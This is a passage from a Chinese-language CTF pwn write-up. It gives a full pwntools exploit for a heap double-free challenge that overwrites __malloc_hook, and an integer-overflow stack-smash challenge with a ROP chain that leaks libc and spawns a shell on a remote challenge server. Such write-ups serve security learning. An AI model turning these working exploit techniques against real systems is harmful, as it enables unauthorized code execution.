            return p.recv()
        else:
            return p.recv(timeout=timeout)
    def ru(s, timeout=0):
        if timeout == 0:
            return p.recvuntil(s)
        else:
            return p.recvuntil(s, timeout=timeout)
    def sla(p,a,s):
        return p.sendlineafter(a,s)
    def sda(p,a,s):
        return p.sendafter(a,s)
    def debug(addr=''):
        gdb.attach(p,'')
        pause()
    def getshell():
        p.interactive()
    #-------------------------------------    def create(size,name,kind):
        sla(p,"Your choice : ","1")
        sla(p,"Length of the name :",str(size))
        sda(p,"The name of animal :",name)
        sla(p,"The kind of the animal :",kind)
    def show():
        sla(p,"Your choice : ","2")
    def delete(index):
        sla(p,"Your choice : ","3")
        sla(p,"Which animal do you want to remove from the cage:",str(index))
    def clean():
        sla(p,"Your choice : ","4")
    #debug()
    create(0x80,"a"*8,"x"*0x08)
    create(0x80,"a"*8,"x"*0x08)
    delete(0)
    clean()
    #这里需要注意，delet完以后还得clean保证一个character中的两个chunk都被free了
    #否则下面新创建chunk的时候会导致分配不到跟原先一样的指针
    create(0x80,"\xff"*8,"x"*0x10)
    show()
    ru("\xff"*8)
    leak = u64(p.recv(6).ljust(8,"\x00"))
    malloc_hook = leak-0x58-0x10
    libc_base = malloc_hook-libc.symbols["__malloc_hook"]
    one = libc_base+0xf02a4 # 真实,只能用这个one gadget
    fd = malloc_hook-0x23
    #该0x23为调试所得，具体可以在gdb中查看内存找到，能绕过double-free的检测机制即可
    print "libc_base--->"+hex(libc_base)
    print "leak--->"+hex(leak)
    print "malloc_hook--->"+hex(malloc_hook)
    create(0x68,"a"*0x30,"a"*0x10)#2
    create(0x68,"b"*0x30,"b"*0x10)#3
    create(0x68,"c"*0x30,"c"*0x10)#4
    create(0x68,"d"*0x30,"d"*0x10)#5
    delete(2)
    delete(3)
    delete(2)
    pause()
    create(0x68,p64(fd),"c"*0x10)#2
    pause()
    create(0x68,"c"*0x30,"c"*0x10)#3
    pause()
    create(0x68,"ccc","c"*0x10)#2
    pause()
    create(0x68,"a"*0x13+p64(one),"c"*0x10)#2
    pause()
    delete(0)
    delete(0)
    getshell()
# int_overflow_pwn
这题是主要是一个整数溢出的漏洞，题目本来应该比较简单，但是由于IDA反编译的原因出现的伪c代码很奇怪，比较难分析
保护机制照旧：
    Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
程序逻辑：
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      void *v3; // rsp
      void *v4; // rsp
      int v6; // [rsp+Ch] [rbp-24h]
      void *dest; // [rsp+10h] [rbp-20h]
      unsigned int v8; // [rsp+1Ch] [rbp-14h]
      _DWORD *v9; // [rsp+20h] [rbp-10h]
      void *buf; // [rsp+28h] [rbp-8h]
      v6 = argc;
      init_stdio();
      puts("welcome.....");
      v3 = alloca(32LL);
      buf = (16 * ((&v6 + 3) >> 4));
      read(0, (16 * ((&v6 + 3) >> 4)), 0xCuLL);
      v9 = buf;
      if ( *buf != 0x6E696B53 || v9[1] != 1 )
      {
        puts("some thing wrong");
      }
      else
      {
        v8 = v9[2] + 32;
        v4 = alloca(16 * ((v8 + 30) / 0x10));
        dest = (16 * ((&v6 + 3) >> 4));
        memcpy((16 * ((&v6 + 3) >> 4)), buf, 0xCuLL);
        read(0, dest + 12, v9[2]);
        handle_data();
      }
      return 0;
    }
首先向buf中输入12个字节
得保证，buf[0]=0x6E696B53,buf[1]=0x1
才能进入else中的分支
接着
v4 = alloca(16 * ((buf[2] + 30) / 0x10));
最后
read(0, dest + 12, v9[2])
可以看到，这个read的字节数是我们控制的，而alloc的大小会等于16 * ((buf[2] + 30) / 0x10)
可以看到，alloc的空间大小也是受buf[2]控制的
我们只要构造一个buf[2]=0xffffffff就可以造成很大的输入字节，同时由于负数溢出，又可以使得alloc申请的空间较小，就容易造成栈溢出了
但是这个栈溢出的偏移不好找
需要看一下程序的汇编：
    .text:00000000004007BC ; 16:   v9 = buf;
    .text:00000000004007BC                 mov     rax, [rbp+buf]
    .text:00000000004007C0                 mov     [rbp+v9], rax
    .text:00000000004007C4 ; 17:   if ( *buf != 0x6E696B53 || v9[1] != 1 )
    .text:00000000004007C4                 mov     rax, [rbp+v9]
    .text:00000000004007C8                 mov     eax, [rax]
    .text:00000000004007CA                 cmp     eax, 6E696B53h
    .text:00000000004007CF                 jnz     loc_400875
    .text:00000000004007D5                 mov     rax, [rbp+v9]
    .text:00000000004007D9                 mov     eax, [rax+4]
    .text:00000000004007DC                 cmp     eax, 1
    .text:00000000004007DF                 jnz     loc_400875
    .text:00000000004007E5 ; 23:     v8 = v9[2] + 32;
    .text:00000000004007E5                 mov     rax, [rbp+v9]
    .text:00000000004007E9                 mov     eax, [rax+8]
    .text:00000000004007EC                 add     eax, 20h
    .text:00000000004007EF                 mov     [rbp+v8], eax
    .text:00000000004007F2 ; 24:     v4 = alloca(16 * ((v8 + 30) / 0x10));
    .text:00000000004007F2                 mov     eax, [rbp+v8]
    .text:00000000004007F5                 lea     rdx, [rax+0Fh]
    .text:00000000004007F9                 mov     eax, 10h
    .text:00000000004007FE                 sub     rax, 1
    .text:0000000000400802                 add     rax, rdx
    .text:0000000000400805                 mov     esi, 10h
    .text:000000000040080A                 mov     edx, 0
    .text:000000000040080F                 div     rsi
    .text:0000000000400812                 imul    rax, 10h
    .text:0000000000400816                 sub     rsp, rax
    .text:0000000000400819                 mov     rax, rsp
    .text:000000000040081C                 add     rax, 0Fh
    .text:0000000000400820                 shr     rax, 4
    .text:0000000000400824 ; 25:     dest = (16 * ((&v6 + 3) >> 4));
    .text:0000000000400824                 shl     rax, 4
    .text:0000000000400828                 mov     [rbp+dest], rax
    .text:000000000040082C ; 26:     memcpy((16 * ((&v6 + 3) >> 4)), buf, 0xCuLL);
    .text:000000000040082C                 mov     rcx, [rbp+buf]
    .text:0000000000400830                 mov     rax, [rbp+dest]
    .text:0000000000400834                 mov     edx, 0Ch        ; n
    .text:0000000000400839                 mov     rsi, rcx        ; src
    .text:000000000040083C                 mov     rdi, rax        ; dest
    .text:000000000040083F                 call    _memcpy
通过汇编可以看到，dest的地址是存放在rax中的，于是进入gdb调试在0x400824的地方下个断点
接着c一下，会停在断点处：
再si一下，让完成 shl rax, 0x4指令，这时可以得到dest的地址，从而计算dest到rbp的偏移，而由于
read(0, dest + 12, v9[2]);
因此这个偏移需要再减去12
于是覆盖至ret的偏移量就是0x7c了
知道偏移量后，就很简单了
  1. 构造rop，首先泄漏libc，再跳转回main函数
  2. 利用第二次栈溢出执行system(/bin/sh)
如果对rop不是很了解的话可以参考以下学习：
[ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic_rop/)
[一步一步学ROP之linux_x86篇](http://www.vuln.cn/6645)
[一步一步学ROP之linux_x64篇](http://www.vuln.cn/6644)
[ctf-all-in-one](https://github.com/firmianay/CTF-All-In-One/blob/master/doc/3.1.4_rop_x86.md)
exp:
    #encoding:utf-8
    #!/upr/bin/env python
    from pwn import *
    context.log_level = "debug"
    bin_elf = "./supwn7"
    context.binary=bin_elf
    elf = ELF(bin_elf)
    libc = ELF("./libc64.so")
    #libc = elf.libc
    if sys.argv[1] == "r":
        p = remote("43.254.3.203","10007")
    elif sys.argv[1] == "l":
        p = process(bin_elf)
    #-------------------------------------    def sl(s):
        return p.sendline(s)
    def sd(s):
        return p.send(s)
    def rc(timeout=0):
        if timeout == 0:
            return p.recv()
        else:
            return p.recv(timeout=timeout)
    def ru(s, timeout=0):
        if timeout == 0:
            return p.recvuntil(s)
        else:
            return p.recvuntil(s, timeout=timeout)
    def sla(p,a,s):
        return p.sendlineafter(a,s)
    def sda(p,a,s):
        return p.sendafter(a,s)
    def debug(addr=''):
        gdb.attach(p,'')
    def getshell():
        p.interactive()
    #-------------------------------------    pop_rdi=0x00000000004008f3
    puts_got = elf.got['puts']
    puts_plt = elf.plt['puts']
    main = 0x40074a
    #debug()
    payload = p32(0x6E696B53)+p32(0x1)+p32(0xffffffff)
    ru("welcome.....\n")
    sd(payload)
    pause()
    payload = "a"*0x7c
    payload += p64(pop_rdi)+p64(puts_got)+p64(puts_plt)
    payload += p64(main)#返回main函数第二次执行
    p.send(payload)
    pause()
    leak = u64(p.recvuntil("\x7f").ljust(8, "\x00"))
    libc_base = leak - libc.symbols['puts']
    binsh = libc_base+libc.search("/bin/sh\x00").next()
    system = libc_base+libc.symbols['system']
    print "libc_base---->"+hex(libc_base)
    print "system---->"+hex(system)
    print "binsh---->"+hex(binsh)
    pause()
    print "--------------------------hacking------------"
    payload = p32(0x6E696B53)+p32(0x1)+p32(0xffffffff)
    ru("welcome.....\n")
    sd(payload)
    pause()
    payload = "a"*0x7c
    payload += p64(pop_rdi)+p64(binsh)+p64(system)
    payload += p64(0xdeadbeef)
    sd(payload)
    getshell()